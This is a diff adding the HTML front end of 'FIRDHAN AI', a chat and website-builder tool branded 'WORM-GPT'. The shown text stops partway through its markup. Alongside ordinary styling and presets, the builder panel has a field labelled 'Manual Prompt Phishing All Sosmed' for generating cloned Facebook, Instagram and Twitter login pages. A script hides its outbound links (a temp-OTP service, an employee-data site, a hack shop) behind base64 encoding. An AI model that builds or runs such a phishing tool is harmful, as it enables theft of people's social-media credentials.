@@ -1,0 +1,1086 @@
+<!DOCTYPE html><html lang="id"><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FIRDHAN AI - V1.7</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/chat.css">
+  <link rel="stylesheet" href="/css/strider-theme.css">
+  <link rel="stylesheet" href="/css/theme-worm.css">
+<base target="_blank">
+
+<style id="builderStyles" media="not all">
+/* ============================================================
+   FIRDHAN AI — WEB BUILDER STUDIO V2.0
+   Single-file · Parallax edition · Zero dependency
+   ============================================================ */
+:root{
+  --bg:#0a0203;
+  --bg-2:#160404;
+  --card:rgba(255,255,255,.045);
+  --card-border:rgba(255,255,255,.09);
+  --text:#eef1ff;
+  --text-dim:#8b93b8;
+  --accent:#ef2d2d;
+  --accent-2:#8f0f0f;
+  --accent-3:#ff6b6b;
+  --glow:rgba(239,45,45,.4);
+  --radius:20px;
+  --font-body:'Inter',system-ui,sans-serif;
+  --font-display:'Space Grotesk',sans-serif;
+  --font-mono:'JetBrains Mono',monospace;
+  --ok:#34d399;
+  --warn:#fbbf24;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--font-body);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+::selection{background:var(--accent);color:#fff}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--accent),var(--accent-2));border-radius:8px;border:2px solid var(--bg)}
+
+#stars{position:fixed;inset:0;z-index:0;pointer-events:none}
+body::after{content:"";position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.05;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='0.6'/%3E%3C/svg%3E");}
+
+/* ---------- nav ---------- */
+.nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;
+  padding:16px 5vw;transition:background .4s,backdrop-filter .4s,padding .4s}
+.nav.scrolled{background:rgba(5,6,15,.72);backdrop-filter:blur(18px);padding:11px 5vw;border-bottom:1px solid rgba(255,255,255,.06)}
+.logo{font-family:var(--font-display);font-weight:700;font-size:1.1rem;display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--text)}
+.logo-mark{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;font-weight:800;color:#fff;
+  background:linear-gradient(135deg,var(--accent),var(--accent-2));box-shadow:0 0 24px var(--glow)}
+.back-link{color:var(--text-dim);text-decoration:none;font-size:.85rem;font-weight:500;padding:8px 14px;border-radius:999px;transition:all .25s}
+.back-link:hover{color:var(--text);background:rgba(255,255,255,.06)}
+.nav-status{display:flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:.7rem;letter-spacing:.14em;color:var(--ok);
+  padding:7px 14px;border-radius:999px;background:rgba(52,211,153,.08);border:1px solid rgba(52,211,153,.3)}
+.dot-live{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok);animation:blink 1.6s ease-in-out infinite}
+@keyframes blink{50%{opacity:.25}}
+
+/* ---------- hero ---------- */
+.hero{position:relative;min-height:56vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  text-align:center;padding:140px 5vw 60px;overflow:hidden;z-index:2}
+.plx{position:absolute;pointer-events:none;will-change:transform;z-index:0}
+.orb{position:absolute;border-radius:50%;filter:blur(70px);opacity:.5}
+.orb-1{width:480px;height:480px;left:-8%;top:-10%;background:radial-gradient(circle,#ef2d2d,transparent 70%)}
+.orb-2{width:440px;height:440px;right:-6%;top:0;background:radial-gradient(circle,#ef2d2d,transparent 70%)}
+.orb-3{width:380px;height:380px;left:30%;bottom:-20%;background:radial-gradient(circle,#7f1d1d,transparent 70%)}
+.ring{position:absolute;border:1px solid rgba(239,45,45,.16);border-radius:50%}
+.ring-1{width:560px;height:560px;left:50%;top:50%;margin:-280px 0 0 -280px;animation:spin 44s linear infinite}
+.ring-1 i{position:absolute;top:-5px;left:50%;width:10px;height:10px;border-radius:50%;background:var(--accent-3);box-shadow:0 0 18px var(--accent-3)}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hero-badge{position:relative;z-index:3;display:inline-flex;align-items:center;gap:10px;padding:8px 18px;border-radius:999px;margin-bottom:24px;
+  background:rgba(239,45,45,.08);border:1px solid rgba(239,45,45,.3);font-size:.75rem;font-weight:600;
+  letter-spacing:.14em;text-transform:uppercase;color:#ffb3b3;animation:heroIn .9s cubic-bezier(.16,1,.3,1) .1s both}
+.hero-title{position:relative;z-index:3;font-family:var(--font-display);font-size:clamp(2.4rem,6.5vw,5rem);
+  font-weight:700;line-height:1.05;letter-spacing:-.03em;margin-bottom:18px}
+.hero-title em{font-style:normal;background:linear-gradient(100deg,#ef2d2d 10%,#b91c1c 45%,#ff6b6b 90%);
+  background-size:200% 100%;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;animation:gradShift 6s ease-in-out infinite}
+@keyframes gradShift{0%,100%{background-position:0% 0}50%{background-position:100% 0}}
+.hero-sub{position:relative;z-index:3;max-width:600px;color:var(--text-dim);font-size:1.02rem;line-height:1.7;animation:heroIn .9s cubic-bezier(.16,1,.3,1) .3s both}
+@keyframes heroIn{from{opacity:0;transform:translateY(26px)}to{opacity:1;transform:translateY(0)}}
+
+/* ---------- studio layout ---------- */
+.studio{position:relative;z-index:2;padding:30px 4vw 120px;display:grid;grid-template-columns:420px 1fr;gap:24px;max-width:1560px;margin:0 auto}
+@media (max-width:1024px){.studio{grid-template-columns:1fr}}
+
+.panel{position:relative;border-radius:24px;background:rgba(10,13,31,.7);border:1px solid rgba(239,45,45,.2);
+  backdrop-filter:blur(22px);box-shadow:0 30px 90px rgba(0,0,0,.5);overflow:hidden;
+  opacity:0;transform:translateY(46px)}
+.panel.reveal{opacity:1;transform:none;transition:opacity .8s cubic-bezier(.16,1,.3,1),transform .8s cubic-bezier(.16,1,.3,1)}
+.panel::before{content:"";position:absolute;top:0;left:10%;right:10%;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(239,45,45,.7),transparent)}
+
+.panel-head{display:flex;align-items:center;gap:10px;padding:16px 20px;border-bottom:1px solid rgba(255,255,255,.07);
+  font-family:var(--font-display);font-weight:600;font-size:.95rem}
+.panel-head .ph-dot{width:9px;height:9px;border-radius:50%}
+.panel-body{padding:22px 20px}
+
+/* controls */
+.field{margin-bottom:18px}
+.field label{display:block;font-size:.72rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--text-dim);margin-bottom:9px}
+textarea#prompt{width:100%;min-height:130px;resize:vertical;background:rgba(255,255,255,.05);border:1px solid var(--card-border);
+  border-radius:14px;color:var(--text);font-family:var(--font-body);font-size:.95rem;padding:14px 16px;outline:none;
+  transition:border-color .3s,box-shadow .3s;line-height:1.6}
+textarea#prompt:focus{border-color:rgba(239,45,45,.6);box-shadow:0 0 0 3px rgba(239,45,45,.14)}
+textarea#prompt::placeholder{color:var(--text-dim)}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chip{cursor:pointer;font-size:.76rem;font-weight:600;padding:7px 13px;border-radius:999px;color:var(--text-dim);
+  background:rgba(255,255,255,.05);border:1px solid var(--card-border);transition:all .22s}
+.chip:hover{color:var(--text);transform:translateY(-1px)}
+.chip.on{color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent-2));border-color:transparent;box-shadow:0 4px 18px var(--glow)}
+select,input[type=text]{width:100%;background:rgba(255,255,255,.05);border:1px solid var(--card-border);border-radius:12px;
+  color:var(--text);font-family:var(--font-body);font-size:.9rem;padding:11px 14px;outline:none;transition:border-color .3s}
+select:focus,input[type=text]:focus{border-color:rgba(239,45,45,.6)}
+select option{background:#12152b;color:var(--text)}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:9px;cursor:pointer;border:none;text-decoration:none;
+  font-family:var(--font-body);font-weight:700;font-size:.92rem;padding:15px 22px;border-radius:14px;transition:all .28s;width:100%}
+.btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 8px 30px var(--glow)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 14px 44px rgba(220,38,38,.5)}
+.btn-primary:disabled{opacity:.55;cursor:not-allowed;transform:none}
+.btn-ghost{background:rgba(255,255,255,.05);color:var(--text);border:1px solid var(--card-border)}
+.btn-ghost:hover{background:rgba(255,255,255,.1)}
+.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px}
+
+.status{min-height:22px;margin-top:14px;font-family:var(--font-mono);font-size:.74rem;color:var(--text-dim);line-height:1.6}
+.status.ok{color:var(--ok)}
+.status.err{color:#f87171}
+.status .cur{display:inline-block;width:7px;height:13px;background:var(--accent-3);vertical-align:-2px;animation:blink .8s steps(1) infinite;margin-left:2px}
+
+/* progress bar */
+.pbar{height:5px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden;margin-top:12px;opacity:0;transition:opacity .3s}
+.pbar.show{opacity:1}
+.pbar i{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,var(--accent),var(--accent-2),var(--accent-3));transition:width .35s ease}
+
+/* console log */
+.mini-log{margin-top:16px;border-top:1px dashed rgba(255,255,255,.09);padding-top:12px;font-family:var(--font-mono);
+  font-size:.7rem;color:var(--text-dim);max-height:150px;overflow-y:auto;display:flex;flex-direction:column;gap:5px}
+.mini-log div{animation:msgIn .3s ease both}
+.mini-log .t{color:var(--accent-3)}
+@keyframes msgIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+/* preview + code */
+.workspace{display:flex;flex-direction:column;gap:24px;min-width:0}
+.preview-frame-wrap{position:relative;background:#04050c;border-radius:18px;overflow:hidden;height:520px;border:1px solid rgba(255,255,255,.08)}
+.preview-frame-wrap iframe{width:100%;height:100%;border:0;background:#fff}
+.preview-empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;
+  color:var(--text-dim);text-align:center;padding:30px;transition:opacity .4s}
+.preview-empty .big{font-size:2.6rem;opacity:.5}
+.preview-empty p{font-size:.9rem;max-width:340px;line-height:1.7}
+.preview-frame-wrap.has-preview .preview-empty{opacity:0;pointer-events:none}
+.refresh-btn{position:absolute;top:12px;right:12px;z-index:5;width:38px;height:38px;border-radius:11px;cursor:pointer;
+  display:grid;place-items:center;color:var(--text);background:rgba(10,13,31,.85);border:1px solid var(--card-border);
+  backdrop-filter:blur(10px);transition:all .25s;opacity:0;pointer-events:none}
+.preview-frame-wrap.has-preview .refresh-btn{opacity:1;pointer-events:auto}
+.refresh-btn:hover{background:rgba(239,45,45,.25);transform:rotate(90deg)}
+
+/* code tabs */
+.code-panel .tabs{display:flex;gap:4px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.07);overflow-x:auto}
+.tab{cursor:pointer;font-family:var(--font-mono);font-size:.74rem;padding:8px 16px;border-radius:10px;color:var(--text-dim);
+  background:transparent;border:1px solid transparent;transition:all .22s;white-space:nowrap}
+.tab:hover{color:var(--text)}
+.tab.on{color:#fff;background:rgba(239,45,45,.15);border-color:rgba(239,45,45,.35)}
+.code-panel pre{margin:0;padding:20px;overflow:auto;height:380px;font-family:var(--font-mono);font-size:.76rem;line-height:1.7;
+  color:#c7cdf0;background:rgba(0,0,0,.25)}
+.code-panel pre::-webkit-scrollbar-thumb{border-color:transparent}
+.code-empty{height:380px;display:flex;align-items:center;justify-content:center;color:var(--text-dim);font-size:.85rem}
+.copy-float{position:absolute;top:64px;right:24px;z-index:6;font-size:.72rem;font-weight:600;cursor:pointer;padding:7px 14px;
+  border-radius:999px;color:var(--text);background:rgba(10,13,31,.9);border:1px solid var(--card-border);opacity:0;pointer-events:none;transition:opacity .3s}
+.code-panel.has-code .copy-float{opacity:1;pointer-events:auto}
+.copy-float:hover{background:rgba(239,45,45,.25)}
+
+.toast{position:fixed;bottom:28px;left:50%;transform:translate(-50%,80px);z-index:200;padding:13px 24px;border-radius:999px;
+  font-size:.85rem;font-weight:600;background:rgba(20,24,48,.92);border:1px solid rgba(239,45,45,.4);backdrop-filter:blur(14px);
+  box-shadow:0 12px 40px rgba(0,0,0,.5);transition:transform .5s cubic-bezier(.16,1,.3,1);pointer-events:none}
+.toast.show{transform:translate(-50%,0)}
+
+footer{position:relative;z-index:2;padding:44px 5vw;text-align:center;color:var(--text-dim);font-size:.82rem;border-top:1px solid rgba(255,255,255,.05)}
+footer b{background:linear-gradient(135deg,var(--accent),var(--accent-3));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms !important;transition-duration:.01ms !important}}
+</style>
+<style id="viewStyles">#webBuilderView{display:none}body.builder-mode #chatView{display:none}body.builder-mode #webBuilderView{display:block}</style></head><body data-theme="dark" style="display:none">
+  <script src="/js/auth.js"></script>
+  <script src="/js/auth-guard.js"></script>
+
+  <!-- Main logic -->
+  <script type="module" src="/js/app.js"></script>
+
+  <!-- Background particles -->
+  <section id="chatView"><div class="particles" id="particles"></div>
+  <!-- Top-left history dropdown -->
+  <div class="history-dropdown" id="historyDropdown">
+    <div style="display:flex;align-items:center;gap:8px">
+      <button id="historyDropdownBtn" class="theme-toggle" aria-expanded="false">Obrolan ▾</button>
+      <button id="historyTrashBtn" class="theme-toggle history-trash" title="Hapus riwayat obrolan" aria-label="Hapus riwayat obrolan">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
+      </button>
+    </div>
+    <div id="historyDropdownList" class="history-dropdown-list" aria-label="Daftar obrolan"></div>
+  </div>
+
+
+  <!-- Right-side navbar (hamburger + panel) -->
+  <div class="right-navbar">
+    <button id="hamburgerBtn" class="hamburger-btn" aria-label="Open menu" aria-expanded="false">
+      <span class="hamburger-line"></span>
+      <span class="hamburger-line"></span>
+      <span class="hamburger-line"></span>
+    </button>
+
+    <nav id="navPanel" class="nav-panel" aria-hidden="true">
+      <div class="nav-header">
+          <div style="display:flex;gap:8px;align-items:center">
+            <strong>Menu</strong>
+          </div>
+          <button id="closeNavBtn" class="close-nav" aria-label="Close menu">×</button>
+      </div>
+        <ul class="nav-list">
+        <li>
+          <button id="newChatBtn" class="nav-item nav-new-chat" title="New Chat">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 11h-6V5h-2v6H5v2h6v6h2v-6h6z"/></svg>
+            <span class="nav-label">+ New Chat</span>
+          </button>
+        </li>
+        <li>
+          <button id="webBuilderBtn" class="nav-item" title="Web Builder">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+              stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <circle cx="12" cy="12" r="9"></circle>
+              <path d="M3 12h18"></path>
+              <path d="M12 3c2.4 2.5 3.6 5.5 3.6 9s-1.2 6.5-3.6 9"></path>
+              <path d="M12 3c-2.4 2.5-3.6 5.5-3.6 9s1.2 6.5 3.6 9"></path>
+            </svg>
+            <span class="nav-label">Web Builder</span>
+          </button>
+        </li>
+        <li><button id="apiCheckBtn" class="nav-item" title="API Check"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 1a5 5 0 00-5 5v3H5a2 2 0 00-2 2v8a2 2 0 002 2h14a2 2 0 002-2v-8a2 2 0 00-2-2h-2V6a5 5 0 00-5-5zm-3 8V6a3 3 0 116 0v3H9zM7 19v-6h10v6H7z" /></svg><span class="nav-label">API Check</span></button></li>
+        <li><button id="paletteBtn" class="nav-item" title="World Monitor"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12c0 3.87 3.13 7 7 7h7c2.21 0 4-1.79 4-4 0-1.1-.9-2-2-2h-1c-.55 0-1-.45-1-1s.45-1 1-1h1c1.1 0 2-.9 2-2 0-4.42-3.58-8-8-8zm0 2c3.31 0 6 2.69 6 6 0 .55-.45 1-1 1h-1c-1.1 0-2 .9-2 2s.9 2 2 2h1c.55 0 1 .45 1 1 0 1.1-.9 2-2 2h-7c-2.76 0-5-2.24-5-5s2.24-5 5-5z"/></svg><span class="nav-label">World Monitor</span></button></li>
+        <li><button id="themeToggle" class="nav-item" title="Toggle Theme"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"/></svg><span class="nav-label">Toggle Theme</span></button></li>
+        <li><button id="qrBtn" class="nav-item" title="QR"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M3 3h8v8H3zM5 5v4h4V5zM13 3h8v8h-8zM15 5v4h4V5zM3 13h8v8H3zM5 15v4h4v-4zM11 11h2v2h-2zM17 13h2v2h-2zM11 17h2v2h-2zM17 17h2v2h-2z"/></svg><span class="nav-label">QR</span></button></li>
+        <li><button id="shopBtn" class="nav-item" title="Shop"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zm10 0c-1.1 0-1.99.9-1.99 2S15.9 22 17 22s2-.9 2-2-.9-2-2-2zm7.16 14h9.66l-1.2-4H8.53L7.16 14zM20 6H6.21l-.94-2H1v2h3l3.6 7.59L6.25 16c-.14.27-.25.57-.25.91 0 1.1.9 2 2 2h12v-2H8.42c-.14 0-.25-.11-.25-.25L8.5 14h8.2c.75 0 1.41-.41 1.75-1.03L22 6c0-.55-.45-1-1-1z"/></svg><span class="nav-label">Shop</span></button></li>
+        <li><button id="tempOtpBtn" class="nav-item" title="Temp-OTP"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/></svg><span class="nav-label">Temp-OTP</span></button></li>
+        <li><button id="databaseBtn" class="nav-item" title="Database"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 3C7.03 3 3 4.79 3 7v10c0 2.21 4.03 4 9 4s9-1.79 9-4V7c0-2.21-4.03-4-9-4zm0 2c3.87 0 7 .9 7 2s-3.13 2-7 2-7-.9-7-2 3.13-2 7-2zm7 8c0 1.1-3.13 2-7 2s-7-.9-7-2v-2c1.49 1.25 4.42 2 7 2s5.51-.75 7-2v2zm0 4c0 1.1-3.13 2-7 2s-7-.9-7-2v-2c1.49 1.25 4.42 2 7 2s5.51-.75 7-2v2z"/></svg><span class="nav-label">Database</span></button></li>
+        <li><button id="logoutBtn" class="nav-item" title="Logout"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M16 13v-2H7V8l-5 4 5 4v-3zM20 3h-8v2h8v14h-8v2h8c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg><span class="nav-label">Logout</span></button></li>  
+        <li><button id="clearHistoryBtn" class="nav-item" title="Clear history"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg><span class="nav-label">Clear history</span></button></li>
+      </ul>
+    </nav>
+  </div>
+
+  <!-- Main Container -->
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <h1 class="main-title">FIRDHAN AI</h1>
+      <div class="header-portfolio">
+      </div>
+      <p class="subtitle">Tools V1.7</p>
+    </div>
+
+    <!-- Status Bar -->
+    <div class="status-bar">
+      <div class="status-item">
+        <div class="status-dot"></div>
+        <span>Status: <strong>Online</strong></span>
+        <span>Model Ai: <strong>WORM-GPT</strong></span>
+      </div>
+      <div class="status-item">
+        <span>Memory: <strong>Active</strong></span>
+      </div>
+    </div>
+
+    <section id="webBuilderPanel" class="web-builder-panel" hidden>
+      <!-- ... -->
+    </section>
+
+    <!-- Chat Container -->
+    <div class="chat-container">
+      <!-- Chat Log -->
+      <div class="chat-log" id="chatLog"></div>
+
+      <!-- Input Area -->
+      <div class="input-area">
+        <div class="input-wrapper">
+          <textarea class="chat-input" id="chatInput" placeholder="Apa yang ingin anda tanyakan..." autocomplete="off"
+            rows="1"></textarea>
+          <div class="input-toolbar">
+            <label class="upload-btn" for="fileInput" title="Unggah file (TXT, MD, JSON, DOCX, PDF)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                <path d="M11 5v6H5v2h6v6h2v-6h6v-2h-6V5h-2z" />
+              </svg>
+              <span>File</span>
+            </label>
+            <input id="fileInput" type="file" accept=".txt,.md,.json,.xml,.html,.htm,.csv,.pdf,.docx,.doc" hidden>
+            <div id="selectedFileContainer" class="selected-file-container" hidden>
+              <span id="selectedFileName" class="selected-file-name"></span>
+              <button id="clearSelectedFileBtn" class="clear-file-btn" type="button" aria-label="Batal pilih file" title="Batal pilih file">
+                ×
+              </button>
+            </div>
+          </div>
+        </div>
+        <button class="send-btn" id="sendBtn">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Image generation modal -->
+  <div id="imageModal"
+    style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:2000;align-items:center;justify-content:center;padding:20px;">
+    <div
+      style="background:var(--bg-card);border-radius:12px;padding:18px;max-width:720px;width:100%;box-shadow:var(--shadow);">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+        <strong>Generate Image</strong>
+        <button id="closeImageModal" class="theme-toggle" style="padding:6px 10px;">Close</button>
+      </div>
+      <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
+        <input id="imagePrompt"
+          placeholder="Tuliskan deskripsi gambar (contoh: pemandangan pegunungan saat matahari terbenam)"
+          style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border-color);background:var(--bg-card-light);color:var(--text-primary);">
+        <input id="imageModel" list="modelSuggestions" placeholder="gemini-2.5-flash-image (optional)"
+          style="width:260px;padding:10px;border-radius:8px;border:1px solid var(--border-color);background:var(--bg-card-light);color:var(--text-primary);">
+        <datalist id="modelSuggestions">
+          <option value="gemini-2.5-flash-image"></option>
+          <option value="gemini-1.5-image"></option>
+          <option value="gpt-image-1"></option>
+        </datalist>
+        <select id="imageSize"
+          style="width:140px;padding:10px;border-radius:8px;border:1px solid var(--border-color);background:var(--bg-card-light);color:var(--text-primary);">
+          <option value="512x512">512x512</option>
+          <option value="768x768">768x768</option>
+          <option value="1024x1024" selected>1024x1024</option>
+        </select>
+        <button id="generateImageBtn" class="send-btn" style="padding:10px 14px;height:auto;">Generate</button>
+      </div>
+      <div id="imageProgress" style="margin-bottom:10px;color:var(--text-secondary);display:none;">Generating...</div>
+      <div id="imageResults" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;">
+      </div>
+    </div>
+  </div>
+
+  <!-- Notification -->
+  <div class="notification" id="notification">Text copied successfully!</div></section>
+
+  <script src="/js/image.js"></script>
+  <script src="/js/core-utils.js"></script>
+  <script>
+    (function(){
+      const hamburger = document.getElementById('hamburgerBtn');
+      const nav = document.getElementById('navPanel');
+      const closeBtn = document.getElementById('closeNavBtn');
+
+      function openNav(){
+        nav.classList.add('open');
+        nav.setAttribute('aria-hidden','false');
+        hamburger.setAttribute('aria-expanded','true');
+      }
+      function closeNav(){
+        nav.classList.remove('open');
+        nav.setAttribute('aria-hidden','true');
+        hamburger.setAttribute('aria-expanded','false');
+      }
+
+      hamburger.addEventListener('click', ()=>{
+        if(nav.classList.contains('open')) closeNav(); else openNav();
+      });
+      closeBtn.addEventListener('click', closeNav);
+
+      document.addEventListener('click', (e)=>{
+        if(!nav.contains(e.target) && !hamburger.contains(e.target)) closeNav();
+      });
+      document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') closeNav(); });
+
+      window.hackerThemeLoginAlert = function(){
+        alert('FITUR BETA WORLD MONITOR : UNTUK LANJUT KLIK OKE');
+        window.location.href = _r('aHR0cHM6Ly93b3JsZC1tb25pdG9yLmFwcC8/dXRtX3NvdXJjZT1jaGF0Z3B0LmNvbQ==');
+      }
+
+      const apiBtn = document.getElementById('apiCheckBtn');
+      if(apiBtn) apiBtn.addEventListener('click', ()=> window.open(_r('aHR0cHM6Ly9hcGljaGVjay1saWFydC52ZXJjZWwuYXBwLw=='),'_blank'));
+
+      const qrBtn = document.getElementById('qrBtn');
+      if(qrBtn) qrBtn.addEventListener('click', ()=> window.open(_r('aHR0cHM6Ly9xci1maXJkaGFuLnZlcmNlbC5hcHAv'),'_blank'));
+
+      const tempOtpBtn = document.getElementById('tempOtpBtn');
+      if(tempOtpBtn) tempOtpBtn.addEventListener('click', ()=> window.open(_r('aHR0cHM6Ly90ZW1wbWFpbC1vcnBpbi52ZXJjZWwuYXBwL2xvZ2luLmh0bWw='),'_blank'));
+
+      const databaseBtn = document.getElementById('databaseBtn');
+      if(databaseBtn) databaseBtn.addEventListener('click', ()=> window.open(_r('aHR0cHM6Ly9kYXRhcGVnYXdhaWphYmFyLnZlcmNlbC5hcHAv'),'_blank','noopener,noreferrer'));
+
+      const paletteBtn = document.getElementById('paletteBtn');
+      if(paletteBtn) paletteBtn.addEventListener('click', hackerThemeLoginAlert);
+
+      const shopBtn = document.getElementById('shopBtn');
+      if(shopBtn) shopBtn.addEventListener('click', ()=> window.open(_r('aHR0cHM6Ly9mZWFyaGFja3Nob3AudmVyY2VsLmFwcA=='),'_blank'));
+
+      document.querySelectorAll('.nav-item').forEach(item=>{
+        item.addEventListener('click', ()=> closeNav());
+      });
+    })();
+  </script>
+
+<section id="webBuilderView"><canvas id="stars"></canvas>
+
+<nav class="nav" id="nav">
+  <a class="logo" href="index.html"><span class="logo-mark">F</span>FIRDHAN&nbsp;AI <span style="font-family:var(--font-mono);font-size:.62rem;color:var(--text-dim);letter-spacing:.18em">/ STUDIO</span></a>
+  <div style="display:flex;align-items:center;gap:14px">
+    <a class="back-link" href="#chat">← Kembali ke Chat</a>
+    <span class="nav-status"><span class="dot-live"></span>ENGINE READY</span>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="plx" data-speed="0.05"><div class="ring ring-1"><i></i></div></div>
+  <div class="plx" data-speed="0.18"><div class="orb orb-1"></div><div class="orb orb-2"></div><div class="orb orb-3"></div></div>
+  <div class="hero-badge">🔴 WORM Web Builder — WORM STUDIO</div>
+  <h1 class="hero-title">Bangun Websitemu Secara Instant<br><em>FIRDHAN WORM GPT</em></h1>
+  <p class="hero-sub">Deskripsikan idemu dalam bahasa sehari-hari. Engine FIRDHAN menganalisis intent, menyusun struktur, mewarnai tema, lalu merender pratinjau langsung  semuanya di browser, tanpa server.</p>
+</header>
+
+<main class="studio">
+
+  <!-- ============ CONTROL PANEL ============ -->
+  <section class="panel" id="controlPanel">
+    <div class="panel-head"><span class="ph-dot" style="background:var(--accent-2)"></span>Prompt Konstruksi</div>
+    <div class="panel-body">
+      <div class="field">
+        <label>Deskripsi Website</label>
+        <textarea id="prompt" placeholder="Contoh: Buat landing page portofolio fotografer dengan gaya gelap, hero besar, galeri karya, testimoni klien, dan form kontak..."></textarea>
+      </div>
+
+      <!-- ============ TAMBAHAN TEXTBOX MANUAL PHISHING ALL SOSMED (TANPA PRESET) ============ -->
+      <div class="field" style="margin-top:16px;border-top:1px dashed rgba(255,255,255,.1);padding-top:16px;">
+        <label style="color:var(--accent-3);">🔥 Manual Prompt Phishing All Sosmed (Tanpa Preset)</label>
+        <textarea id="phishingPrompt" placeholder="Ketik prompt manual kloningan login mirip Facebook, Instagram, Twitter, dll. secara detail di sini..." style="min-height:100px;border-color:rgba(239,45,45,.4);"></textarea>
+      </div>
+      <!-- =================================================================================== -->
+
+      <div class="field">
+        <label>Quick Preset</label>
+        <div class="chips" id="presetChips">
+          <span class="chip" data-p="portfolio">🎨 Portofolio</span>
+          <span class="chip" data-p="startup">🚀 Startup SaaS</span>
+          <span class="chip" data-p="kuliner">🍜 Restoran</span>
+          <span class="chip" data-p="toko">🛍️ Toko Online</span>
+          <span class="chip" data-p="blog">✍️ Blog Pribadi</span>
+        </div>
+      </div>
+      <div class="field">
+        <label>Gaya Visual</label>
+        <div class="chips" id="styleChips">
+          <span class="chip on" data-s="dark">🌙 Gelap</span>
+          <span class="chip" data-s="light">☀️ Terang</span>
+          <span class="chip" data-s="colorful">🌈 Colorful</span>
+          <span class="chip" data-s="minimal">⬜ Minimal</span>
+        </div>
+      </div>
+      <div class="field row2">
+        <div>
